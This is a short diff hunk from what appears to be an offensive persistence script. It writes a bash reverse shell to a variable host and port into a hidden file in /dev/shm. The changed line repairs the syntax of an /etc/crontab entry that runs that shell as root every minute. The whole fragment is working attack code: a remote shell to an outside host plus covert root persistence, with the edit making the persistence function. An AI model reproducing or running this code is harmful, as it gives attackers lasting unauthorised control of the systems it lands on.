@@ -12,5 +12,5 @@ echo "bash -i >& /dev/tcp/$Ip/$porta 0>&1" > .persistense.sh
 chmod +x .persistense.sh
 mv .persistense.sh /dev/shm
 
-echo "* * * * * * root /dev/shm/.persistense.sh" >> /etc/crontab
+echo "* *   * * *   root bash /dev/shm/.persistense.sh" >> /etc/crontab
 
